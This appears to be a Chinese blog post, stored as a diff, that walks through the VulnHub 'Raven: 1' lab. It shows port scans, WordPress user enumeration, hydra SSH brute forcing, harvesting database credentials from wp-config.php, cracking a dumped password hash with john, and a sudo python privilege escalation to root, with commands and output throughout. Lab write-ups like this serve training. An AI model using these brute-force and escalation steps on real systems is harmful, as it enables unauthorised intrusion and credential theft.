@@ -1,0 +1,601 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+  <title>Raven：1 - Knight&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Knight's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/post.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Raven：1">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-06-27 00:00" pubdate>
+        2022年6月27日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.9k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      69
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Raven：1</h1>
+            
+            <div class="markdown-body">
+              <h1 id="0x0A-Raven-1-vulnhub"><a href="#0x0A-Raven-1-vulnhub" class="headerlink" title="0x0A Raven: 1~vulnhub"></a>0x0A Raven: 1~vulnhub</h1><blockquote>
+<p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/raven-1,256/">Raven: 1 ~ VulnHub</a></p>
+<p>环境信息：</p>
+<ul>
+<li>攻击机 IP：192.168.135.141</li>
+<li>靶机 IP：192.168.135.149</li>
+</ul>
+</blockquote>
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h3><p><strong>nmap 命令：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span>  <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-27 05:23 EDT<br>Nmap scan report for 192.168.135.2<br>Host is up (0.0030s latency).<br>Nmap scan report for 192.168.135.141<br>Host is up (0.0010s latency).<br>Nmap scan report for 192.168.135.149<br>Host is up (0.00048s latency).<br>Nmap done: 256 IP addresses (3 hosts up) scanned in 4.89 seconds<br></code></pre></td></tr></table></figure>
+<p><strong>得到靶机 ip：192.168.135.149</strong></p>
+<h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p><strong>简单的端口扫描：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -p- 192.168.135.149</span><br>[sudo] password for kali: <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-27 05:26 EDT<br>Nmap scan report for 192.168.135.149<br>Host is up (0.0016s latency).<br>Not shown: 65531 closed ports<br>PORT      STATE SERVICE<br>22/tcp    open  ssh<br>80/tcp    open  http<br>111/tcp   open  rpcbind<br>37354/tcp open  unknown<br>MAC Address: 00:0C:29:DE:6D:0E (VMware)<br><br>Nmap done: 1 IP address (1 host up) scanned in 4.03 seconds<br></code></pre></td></tr></table></figure>
+<p><strong>全面扫描：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -A -p- 192.168.135.149</span>      <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-27 05:26 EDT<br>Nmap scan report for 192.168.135.149<br>Host is up (0.00028s latency).<br>Not shown: 65531 closed ports<br>PORT      STATE SERVICE VERSION<br>22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)<br>| ssh-hostkey: <br>|   1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:fc (DSA)<br>|   2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)<br>|   256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)<br>|_  256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)<br>80/tcp    open  http    Apache httpd 2.4.10 ((Debian))<br>|_http-server-header: Apache/2.4.10 (Debian)<br>|_http-title: Raven Security<br>111/tcp   open  rpcbind 2-4 (RPC #100000)<br>| rpcinfo: <br>|   program version    port/proto  service<br>|   100000  2,3,4        111/tcp   rpcbind<br>|   100000  2,3,4        111/udp   rpcbind<br>|   100000  3,4          111/tcp6  rpcbind<br>|   100000  3,4          111/udp6  rpcbind<br>|   100024  1          37354/tcp   status<br>|   100024  1          42390/udp6  status<br>|   100024  1          47848/udp   status<br>|_  100024  1          56818/tcp6  status<br>37354/tcp open  status  1 (RPC #100024)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 16.78 seconds<br></code></pre></td></tr></table></figure>
+<p><strong>得到目标端口信息：</strong></p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>PORT</th>
+<th>STATE</th>
+<th>SERVICE</th>
+<th>VERSION</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22/tcp</td>
+<td>open</td>
+<td>ssh</td>
+<td>OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)</td>
+</tr>
+<tr>
+<td>80/tcp</td>
+<td>open</td>
+<td>http</td>
+<td>Apache httpd 2.4.10 ((Debian))</td>
+</tr>
+<tr>
+<td>111/tcp</td>
+<td>open</td>
+<td>rpcbind</td>
+<td>rpcbind 2-4</td>
+</tr>
+<tr>
+<td>37354/tcp</td>
+<td>open</td>
+<td>status</td>
+<td>1 (RPC #100024)</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="3、端口探测"><a href="#3、端口探测" class="headerlink" title="3、端口探测"></a>3、端口探测</h3><p><strong>80端口</strong></p>
+<p>进行目录爆破：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.149:80</span><br>---- Scanning URL: http://192.168.135.149:80/ ----<br>+ http://192.168.135.149:80/index.html (CODE:200|SIZE:16819)<br>+ http://192.168.135.149:80/server-status (CODE:403|SIZE:303)<br>==&gt; DIRECTORY: http://192.168.135.149:80/wordpress/<br> <br>---- Entering directory: http://192.168.135.149:80/wordpress/ ----<br>+ http://192.168.135.149:80/wordpress/index.php (CODE:301|SIZE:0)<br>==&gt; DIRECTORY: http://192.168.135.149:80/wordpress/wp-admin/<br>==&gt; DIRECTORY: http://192.168.135.149:80/wordpress/wp-content/<br>==&gt; DIRECTORY: http://192.168.135.149:80/wordpress/wp-includes/<br>+ http://192.168.135.149:80/wordpress/xmlrpc.php (CODE:405|SIZE:42)<br></code></pre></td></tr></table></figure>
+<p>访问查看，点击 <code>SERVICE</code> 跳转至 <code>http://192.168.135.149/service.html</code> ，在其源码中找到 flag1：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- End footer Area --&gt;</span>		<br><span class="hljs-comment">&lt;!-- flag1&#123;b9bbcb33e11b80be759c4e844862482d&#125; --&gt;</span><br></code></pre></td></tr></table></figure>
+<p>点击 <code>BLOG</code> 跳转至 <code>http://192.168.135.149/wordpress/</code> ，发现是个 WordPress 站点。</p>
+<blockquote>
+<p>发现点击 blog 的时候系统迟迟跳转不出来服务页面，后面发现跳转到 raven.local，所以修改一下 hosts 文件，方便探索。</p>
+</blockquote>
+<p>点击 <code>Login</code> 跳转至 <code>http://192.168.135.149/wordpress/wp-login.php</code> ，发现是 WordPress 登录页。</p>
+<p>枚举 WordPress 用户：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://192.168.135.149/wordpress --enumerate u</span><br>[+] URL: http://192.168.135.149/wordpress/ [192.168.135.149]<br>[i] User(s) Identified:<br><br>[+] michael<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[+] steven<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br></code></pre></td></tr></table></figure>
+<p>使用 cewl 对站点生成字典：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cewl http://192.168.135.149/wordpress -w passwd.txt</span><br>CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;michael\nsteven&quot;</span> &gt; user.txt</span> <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat user.txt</span>                  <br>michael<br>steven<br></code></pre></td></tr></table></figure>
+<p>使用 wpscan 进行爆破：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://192.168.135.149/wordpress -U user.txt -P passwd.txt</span><br>[+] URL: http://192.168.135.149/wordpress/ [192.168.135.149]<br>[i] No Valid Passwords Found.<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 换个大字典, 扫了几万个没扫到, 直接结束了, 看来是爆不出来</span><br><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://192.168.135.149/wordpress -U user.txt -P /usr/share/wordlists/rockyou.txt</span><br></code></pre></td></tr></table></figure>
+<p><strong>22端口</strong></p>
+<p>得到两个用户名，对 SSH 进行爆破尝试。</p>
+<p><strong>111端口</strong></p>
+<p>查看无果</p>
+<p><strong>37354端口</strong></p>
+<p>查看无果</p>
+<h2 id="二、权限获取"><a href="#二、权限获取" class="headerlink" title="二、权限获取"></a>二、权限获取</h2><p>使用 hydra 对 SSH 进行爆破：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> hydra -L user.txt -P passwd.txt 192.168.135.149 ssh</span><br>1 of 1 target completed, 0 valid password found<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 换个大字典</span><br><span class="hljs-meta">$</span><span class="bash"> hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.135.149 ssh</span><br>[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 28688798 login tries (l:2/p:14344399), ~1793050 tries per task<br>[DATA] attacking ssh://192.168.135.149:22/<br>[22][ssh] host: 192.168.135.149   login: michael   password: michael<br>[STATUS] 14344553.00 tries/min, 14344553 tries in 00:01h, 14344247 to do in 00:01h, 16 active<br></code></pre></td></tr></table></figure>
+<p>成功爆破出一组账号：<code>login: michael   password: michael</code> ，steven 账号密码也在字典中，但破解出来需要较长时间。</p>
+<p>登录 SSH：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh michael@192.168.135.149</span>                                                                               <br>michael@192.168.135.149&#x27;s password: <br><br>michael@Raven:~$ ls<br>michael@Raven:~$ whoami<br>michael<br>michael@Raven:~$ id<br>uid=1000(michael) gid=1000(michael) groups=1000(michael),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)<br></code></pre></td></tr></table></figure>
+<p>使用 find 查找 flag，得到 flag2：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">michael@Raven:~$ find / -name &quot;*flag*.txt&quot; 2&gt;/dev/null<br>/var/www/flag2.txt<br>michael@Raven:~$ cat /var/www/flag2.txt<br>flag2&#123;fc3fd58dcdad9ab23faca6e9a36e581c&#125;<br></code></pre></td></tr></table></figure>
+<p>WordPress 网站是带数据库的，数据库密码在网站的配置文件中；WordPress 作为一款开源的 CMS，配置文件的路径是固定的。 </p>
+<p>查看数据库配置文件，得到数据库账号密码：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /var/www/html/wordpress/wp-config.php</span><br>/** The name of the database for WordPress */<br>define(&#x27;DB_NAME&#x27;, &#x27;wordpress&#x27;);<br><br>/** MySQL database username */<br>define(&#x27;DB_USER&#x27;, &#x27;root&#x27;);<br><br>/** MySQL database password */<br>define(&#x27;DB_PASSWORD&#x27;, &#x27;R@v3nSecurity&#x27;);<br><br>/** MySQL hostname */<br>define(&#x27;DB_HOST&#x27;, &#x27;localhost&#x27;);<br><br>/** Database Charset to use in creating database tables. */<br>define(&#x27;DB_CHARSET&#x27;, &#x27;utf8mb4&#x27;);<br><br>/** The Database Collate type. Don&#x27;t change this if in doubt. */<br>define(&#x27;DB_COLLATE&#x27;, &#x27;&#x27;);<br></code></pre></td></tr></table></figure>
+<p>登录 mysql，选择 <code>wordpress</code> 数据库，在 <code>wp_posts</code> 表中找到 flag3、flag4，在 <code>wp_users</code> 表中找到两个用户：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs shell">michael@Raven:~$ mysql -uroot -p<br>Enter password: <br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> show databases;</span><br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| mysql              |<br>| performance_schema |<br>| wordpress          |<br>+--------------------+<br>4 rows in set (0.01 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> use wordpress;</span><br>Reading table information for completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br><span class="hljs-meta">mysql&gt;</span><span class="bash"> show tables;</span><br>+-----------------------+<br>| Tables_in_wordpress   |<br>+-----------------------+<br>| wp_commentmeta        |<br>| wp_comments           |<br>| wp_links              |<br>| wp_options            |<br>| wp_postmeta           |<br>| wp_posts              |<br>| wp_term_relationships |<br>| wp_term_taxonomy      |<br>| wp_termmeta           |<br>| wp_terms              |<br>| wp_usermeta           |<br>| wp_users              |<br>+-----------------------+<br>12 rows in set (0.00 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select * from wp_posts;</span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select ID, post_author,post_content from wp_posts <span class="hljs-built_in">where</span> post_content like <span class="hljs-string">&quot;flag%&quot;</span>;</span><br>+----+-------------+-----------------------------------------+<br>| ID | post_author | post_content                            |<br>+----+-------------+-----------------------------------------+<br>|  4 |           1 | flag3&#123;afc01ab56b50591e7dccf93122770cd2&#125; |<br>|  5 |           1 | flag4&#123;715dea6c055b9fe3337544932f2941ce&#125; |<br>|  7 |           2 | flag3&#123;afc01ab56b50591e7dccf93122770cd2&#125; |<br>+----+-------------+-----------------------------------------+<br>3 rows in set (0.00 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select * from wp_users;</span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select ID,user_login,user_pass from wp_users;</span><br>+----+------------+------------------------------------+<br>| ID | user_login | user_pass                          |<br>+----+------------+------------------------------------+<br>|  1 | michael    | $P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0 |<br>|  2 | steven     | $P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/ |<br>+----+------------+------------------------------------+<br>2 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure>
+<h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><h3 id="1、Sudo"><a href="#1、Sudo" class="headerlink" title="1、Sudo"></a>1、Sudo</h3><p>michael 用户没有 sudo 权限，既然已经得到了 steven 的加密密码，可以尝试进行破解，看看能不能切换到 Steven 。</p>
+<p>使用 john 进行破解，成功得到 steven 密码：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/&#x27;</span> &gt; 1.txt</span><br><span class="hljs-meta">$</span><span class="bash"> john 1.txt --show</span><br>0 password hashes cracked, 1 left<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> john --wordlist=/usr/share/wordlists/rockyou.txt 1.txt</span>       <br>Using default input encoding: UTF-8<br>Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])<br>Cost 1 (iteration count) is 8192 for all loaded hashes<br>Will run 4 OpenMP threads<br>Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status<br>pink84           (?)<br>1g 0:00:00:08 DONE (2022-06-27 09:51) 0.1203g/s 5522p/s 5522c/s 5522C/s tamika1..milkdud<br>Use the &quot;--show --format=phpass&quot; options to display all of the cracked passwords reliably<br>Session completed<br></code></pre></td></tr></table></figure>
+<p>也可以使用在线解密：<a target="_blank" rel="noopener" href="https://www.somd5.com/">MD5免费在线解密破解_MD5在线加密-SOMD5</a></p>
+<p>切换至 steven ，查看其权限，发现可以 sudo 运行 python，使用 python 进行提权：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs shell">michael@Raven:~$ su steven<br>Password: <br><span class="hljs-meta">$</span><span class="bash"> id</span><br>uid=1001(steven) gid=1001(steven) groups=1001(steven)<br><span class="hljs-meta">$</span><span class="bash"> sudo -l</span><br>Matching Defaults entries for steven on raven:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User steven may run the following commands on raven:<br>    (ALL) NOPASSWD: /usr/bin/python<br><span class="hljs-meta">$</span><span class="bash"> sudo python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br>root@Raven:/home/michael# id<br>uid=0(root) gid=0(root) groups=0(root)<br>root@Raven:/home/michael# find / -name &quot;*flag*.txt&quot; 2&gt;/dev/null<br>/var/www/flag2.txt<br>/root/flag4.txt<br>root@Raven:/home/michael# cat /root/flag4.txt<br>______                      <br>| ___ \                     <br>| |_/ /__ ___   _____ _ __  <br>|    // _` \ \ / / _ \ &#x27;_ \ <br>| |\ \ (_| |\ V /  __/ | | |<br>\_| \_\__,_| \_/ \___|_| |_|<br><br>flag4&#123;715dea6c055b9fe3337544932f2941ce&#125;<br>CONGRATULATIONS on successfully rooting Raven!<br>This is my first Boot2Root VM - I hope you enjoyed it.<br>Hit me up on Twitter and let me know what you thought: <br>@mccannwj / wjmccann.github.io<br></code></pre></td></tr></table></figure>
+<p>再次查找 flag 文件，得到 flag4 。</p>
